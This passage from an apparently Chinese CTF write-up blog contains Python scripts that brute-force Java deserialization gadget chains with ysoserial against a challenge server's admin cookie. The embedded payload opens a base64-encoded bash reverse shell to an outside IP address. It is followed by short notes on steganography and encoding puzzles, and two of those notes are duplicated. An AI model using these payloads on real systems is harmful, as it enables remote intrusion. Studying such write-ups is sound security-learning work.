	cmd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token comment">#result = result.replace('\n','')</span>

	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">'_encode.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
		ff<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

	ff<span class="token operator">=</span>ff<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
	ff<span class="token operator">=</span>ff<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-----BEGIN CERTIFICATE-----'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
	ff<span class="token operator">=</span>ff<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-----END CERTIFICATE-----'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'JSESSIONID'</span><span class="token punctuation">:</span><span class="token string">'27F2790D6C4FB2CDC86DB5A8011DB28A'</span><span class="token punctuation">,</span><span class="token string">'user'</span><span class="token punctuation">:</span>ff<span class="token punctuation">}</span>

	rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://20beb449-5bb6-4940-a43c-97d72b2fc3ce.node4.buuoj.cn:81/admin/"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
	
	<span class="token comment">#time.sleep(2)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>rep<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<pre><code class="prism language-python"><span class="token comment">#jdk1.8 linux</span>
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> os
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> time

payloads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'BeanShell1'</span><span class="token punctuation">,</span><span class="token string">'Click1'</span><span class="token punctuation">,</span><span class="token string">'Clojure'</span><span class="token punctuation">,</span><span class="token string">'CommonsBeanutils1'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections1'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections2'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections3'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections4'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections5'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections6'</span><span class="token punctuation">,</span><span class="token string">'CommonsCollections7'</span><span class="token punctuation">,</span><span class="token string">'Groovy1'</span><span class="token punctuation">,</span><span class="token string">'Hibernate1'</span><span class="token punctuation">,</span><span class="token string">'Hibernate2'</span><span class="token punctuation">,</span><span class="token string">'JBossInterceptors1'</span><span class="token punctuation">,</span><span class="token string">'JavassistWeld1'</span><span class="token punctuation">,</span><span class="token string">'Jdk7u21'</span><span class="token punctuation">,</span><span class="token string">'MozillaRhino1'</span><span class="token punctuation">,</span><span class="token string">'MozillaRhino2'</span><span class="token punctuation">,</span><span class="token string">'Myfaces1'</span><span class="token punctuation">,</span><span class="token string">'ROME'</span><span class="token punctuation">,</span><span class="token string">'Spring1'</span><span class="token punctuation">,</span><span class="token string">'Spring2'</span><span class="token punctuation">,</span><span class="token string">'Vaadin1'</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
    command <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'java -jar ysoserial.jar '</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">' "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMzEuNzYuMjQwLzc5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}" | base64 -w 0'</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> command<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    command<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">#result = result.replace('\n','')</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>

    <span class="token keyword">if</span> result <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>
        <span class="token builtin">open</span><span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">'_intruder.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>result <span class="token operator">+</span> <span class="token string">'n'</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> payload <span class="token keyword">in</span> payloads<span class="token punctuation">:</span>
	<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">'_intruder.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
	    ff<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
	headers <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span><span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'JSESSIONID'</span><span class="token punctuation">:</span><span class="token string">'98C504A30CFBA237247087E5F7D925D7'</span><span class="token punctuation">,</span><span class="token string">'user'</span><span class="token punctuation">:</span>ff<span class="token punctuation">}</span>

	rep <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://20beb449-5bb6-4940-a43c-97d72b2fc3ce.node4.buuoj.cn:81/admin/"</span><span class="token punctuation">,</span>  headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
	
	<span class="token comment">#time.sleep(2)</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>rep<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<h1><a id="MISC_624"></a>MISC</h1>
<h2><a id="Welcome_to_fxxking_626"></a>Welcome to fxxking</h2>
<p>签到</p>
<h2><a id="Pngenius_630"></a>Pngenius</h2>
<p>foremost 分离图片 zip ，zip有密码包含，爆破无效，考虑lsb隐写</p>
<p><img alt="image-20220526105738825" src="https://img-blog.csdnimg.cn/img_convert/007faaf5c398f4c876025119f5d42e64.png"/></p>
<p><img alt="image-20220526105757670" src="https://img-blog.csdnimg.cn/img_convert/629d848c151830dc4bbd7a5955d97e55.png"/></p>
<h2><a id="EasyEncode_638"></a>EasyEncode</h2>
<p>压缩包有密码 不是伪加密 尝试爆破</p>
<p><img alt="image-20220527144915087" src="https://img-blog.csdnimg.cn/img_convert/02f061acf07644e94a94de9c930ef027.png"/></p>
<p>里面就是编码套娃</p>
<p><img alt="image-20220526105914309" src="https://img-blog.csdnimg.cn/img_convert/77b685cfdcee42d070e9de49cb7b7e1a.png"/></p>
<p><img alt="image-20220526105925557" src="https://img-blog.csdnimg.cn/img_convert/e43f57828fa2af872480448efdb88eee.png"/></p>
<p><img alt="image-20220526105933700" src="https://img-blog.csdnimg.cn/img_convert/df408f1901e84df2620d57f60776cb2c.png"/></p>
<p><img alt="image-20220526105940968" src="https://img-blog.csdnimg.cn/img_convert/f59de4291acd145365c5f03ee46eeb38.png"/></p>
<h2><a id="js_654"></a>你知道js吗</h2>
<p>下载的文件，无法直接打开用解压软件查看发现word结构，改后缀docx</p>
<p><img alt="image-20220526110056262" src="https://img-blog.csdnimg.cn/img_convert/5274fece49deccfa1f252a218a73ae87.png"/></p>
<p>字体隐写，换个正常字体就行，后面就是编码套娃</p>
<p><img alt="image-20220526110132662" src="https://img-blog.csdnimg.cn/img_convert/8972930495870e2478c9e77fa5e4a10c.png"/></p>
<p><img alt="image-20220526110147711" src="https://img-blog.csdnimg.cn/img_convert/169d80bed0f3b1e129ca6597aa2d8733.png"/></p>
<p><img alt="image-20220526110159788" src="https://img-blog.csdnimg.cn/img_convert/2074fcfffcad17ee99947fab4c2c9ad4.png"/></p>
<p>百度到去这个网站解码http://tool.bugku.com/brainfuck/?wafcloud=1</p>
<p><img alt="image-20220526110213780" src="https://img-blog.csdnimg.cn/img_convert/b976602cfddbe3cae1f56f8357571b11.png"/></p>
<p><img alt="image-20220526110238260" src="https://img-blog.csdnimg.cn/img_convert/568b758a1fe47118a568973af273afb1.png"/></p>
<p>)]</p>
<h2><a id="EasyEncode_677"></a>EasyEncode</h2>
<p>压缩包有密码 不是伪加密 尝试爆破</p>
<p><img alt="image-20220527144915087" src="https://img-blog.csdnimg.cn/img_convert/2dc41c2954c202d572bc40204186b9c6.png"/></p>
<p>里面就是编码套娃</p>
<p><img alt="image-20220526105914309" src="https://img-blog.csdnimg.cn/img_convert/85501c244ddf063fd79395edb6e45c6c.png"/></p>
<p><img alt="image-20220526105925557" src="https://img-blog.csdnimg.cn/img_convert/2af52256e3c942d13b29b75760622a2a.png"/></p>
<p><img alt="image-20220526105933700" src="https://img-blog.csdnimg.cn/img_convert/16a03c65d7a40c3e1d98deaa3b53754a.png"/></p>
<p><img alt="image-20220526105940968" src="https://img-blog.csdnimg.cn/img_convert/d77802fe519d15b1af6df22ee5a8e573.png"/></p>
<h2><a id="js_693"></a>你知道js吗</h2>
<p>下载的文件，无法直接打开用解压软件查看发现word结构，改后缀docx</p>
<p><img alt="image-20220526110056262" src="https://img-blog.csdnimg.cn/img_convert/09272fb184c9b2f3b16cd5ea2104d0cb.png"/></p>
<p>字体隐写，换个正常字体就行，后面就是编码套娃</p>
<p><img alt="image-20220526110132662" src="https://img-blog.csdnimg.cn/img_convert/48db31d20c25c221cc186ffbd77a9c33.png"/></p>
<p><img alt="image-20220526110147711" src="https://img-blog.csdnimg.cn/img_convert/64314946f4a4e0d9f04f9ffb57dcc58b.png"/></p>
<p><img alt="image-20220526110159788" src="https://img-blog.csdnimg.cn/img_convert/9bd06f7d9dfa7342c080963baf048827.png"/></p>
<p>百度到去这个网站解码http://tool.bugku.com/brainfuck/?wafcloud=1</p>
<p><img alt="image-20220526110213780" src="https://img-blog.csdnimg.cn/img_convert/6c70658d7b9a4c0672da7c522803e1b2.png"/></p>
<p><img alt="image-20220526110238260" src="https://img-blog.csdnimg.cn/img_convert/5bf5acdd957413d5db348fa3bb4320d2.png"/></p>
</div>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
</div>